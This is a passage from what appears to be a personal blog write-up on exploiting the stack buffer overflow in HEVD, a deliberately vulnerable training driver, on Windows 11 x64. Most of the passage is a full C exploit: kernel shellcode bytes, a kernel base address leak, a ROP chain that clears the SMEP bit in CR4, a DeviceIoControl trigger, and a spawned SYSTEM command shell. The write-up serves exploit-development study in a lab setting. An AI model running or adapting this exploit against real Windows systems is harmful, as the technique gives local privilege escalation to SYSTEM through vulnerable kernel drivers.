</pre></table></code></div></div><p>perfect now we have our shellcode ready</p><h2 id="full-exploit"><span class="me-2">Full exploit</span><a href="#full-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="cp">#define QWORD ULONGLONG
</span>
<span class="cp">#define _BUFFER_SIZE 256
</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">sc</span><span class="p">[</span><span class="n">_BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span>
  <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span>
<span class="p">};</span>



<span class="kt">uint64_t</span> <span class="nf">GetKernelBaseAddress</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">ULONG_PTR</span> <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">LPVOID</span><span class="o">*</span> <span class="n">lpImageBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwBytesNeeded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to calculate bytes needed for device driver entries"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">lpImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">)))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to allocate heap for lpImageBase</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span> <span class="n">dwBytesNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBytesNeeded</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] EnumDeviceDrivers: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lpImageBase</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pKernelBaseAddress</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lpImageBase</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Kernel Base Address: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pKernelBaseAddress</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">pKernelBaseAddress</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hDriver</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDriver</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while creating a handle to the driver: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">ULONG_PTR</span> <span class="n">ntBase</span> <span class="o">=</span> <span class="n">GetKernelBaseAddress</span><span class="p">();</span>

    <span class="n">QWORD</span> <span class="n">POP_RCX</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x207c53</span><span class="p">;</span>      <span class="c1">// adjust offset according to your kernel build</span>
    <span class="n">QWORD</span> <span class="n">MOV_CR4_RCX</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x4bc9a7</span><span class="p">;</span>  <span class="c1">// adjust offset according to your kernel build</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] POP_RCX: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">POP_RCX</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] MOV_CR4_RCX: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">MOV_CR4_RCX</span><span class="p">);</span>

    <span class="n">LPVOID</span> <span class="n">uBuffer</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">2500</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="mi">2072</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">uBuffer</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
    
    <span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>

    <span class="n">QWORD</span><span class="o">*</span> <span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="o">*</span><span class="p">)((</span><span class="n">QWORD</span><span class="p">)</span><span class="n">uBuffer</span> <span class="o">+</span> <span class="mi">2072</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">index</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">POP_RCX</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">index</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x370e78</span> <span class="o">^</span> <span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">index</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">MOV_CR4_RCX</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">rop</span> <span class="o">+</span> <span class="n">index</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>

    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="mh">0x222003</span><span class="p">,</span> <span class="n">uBuffer</span><span class="p">,</span> <span class="mi">2500</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] Enjoy your shell!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntBase</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><a href="/R4vensP1t/assets/img/final.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/final.png" alt="The Function Name" loading="lazy"></a></p><p>isn’t this just beautiful !!</p><h2 id="references"><span class="me-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>i followed this guide in my first try exploiting this vulnerability and it was a huge help, this guide is based of <a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/"> xct</a></p><p><a href="https://github.com/B4shCr00k/HEVD-Exploits/tree/main">github_repo</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/R4vensP1t/categories/hevd/">HEVD</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/R4vensP1t/tags/binaryexploitation/" class="post-tag no-text-decoration" >binaryexploitation</a> <a href="/R4vensP1t/tags/drivers/" class="post-tag no-text-decoration" >drivers</a> <a href="/R4vensP1t/tags/kernel/" class="post-tag no-text-decoration" >kernel</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploiting%20HEVD%20Stack%20Buffer%20Overflow%20---%20Windows%2011%20x64%20-%20B4shCr00k&url=https%3A%2F%2Fb4shcr00k.github.io%2FR4vensP1t%2Fposts%2FExploiting-HEVD-StackBufferOverflow%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Exploiting%20HEVD%20Stack%20Buffer%20Overflow%20---%20Windows%2011%20x64%20-%20B4shCr00k&u=https%3A%2F%2Fb4shcr00k.github.io%2FR4vensP1t%2Fposts%2FExploiting-HEVD-StackBufferOverflow%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fb4shcr00k.github.io%2FR4vensP1t%2Fposts%2FExploiting-HEVD-StackBufferOverflow%2F&text=Exploiting%20HEVD%20Stack%20Buffer%20Overflow%20---%20Windows%2011%20x64%20-%20B4shCr00k" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/R4vensP1t/posts/Exploiting-HEVD-StackBufferOverflow/">Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64</a><li class="text-truncate lh-lg"> <a href="/R4vensP1t/posts/Remotely-Resolving-Imports/">Remotely Resolving Imports</a><li class="text-truncate lh-lg"> <a href="/R4vensP1t/posts/Create-Your-First-Windows-Driver/">Create Your First Windows Driver</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/kernel/">kernel</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/drivers/">drivers</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/binaryexploitation/">binaryexploitation</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/driver/">driver</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/guide/">guide</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/R4vensP1t/posts/Remotely-Resolving-Imports/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1753718883" data-df="ll" > Jul 28, 2025 </time><h4 class="pt-0 my-2">Remotely Resolving Imports</h4><div class="text-muted"><p>what are imports basically imports are functions a pe needs to function properly, these functions are located inside dlls (dynamic link libraries) so first the executable needs to load the dll the...</p></div></div></a></article><article class="col"> <a href="/R4vensP1t/posts/Create-Your-First-Windows-Driver/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1753675683" data-df="ll" > Jul 28, 2025 </time><h4 class="pt-0 my-2">Create Your First Windows Driver</h4><div class="text-muted"><p>Hello From Kernel In this guide i will help you write your first windows kernel driver using kmdf This Guide Will Cover What are drivers Prerequisite User Mode VS Ker...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/R4vensP1t/posts/Remotely-Resolving-Imports/" class="btn btn-outline-primary" aria-label="Older" ><p>Remotely Resolving Imports</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/B4shCr00k">B4shCr00k</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.3.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/kernel/">kernel</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/drivers/">drivers</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/binaryexploitation/">binaryexploitation</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/driver/">driver</a> <a class="post-tag btn btn-outline-primary" href="/R4vensP1t/tags/guide/">guide</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas 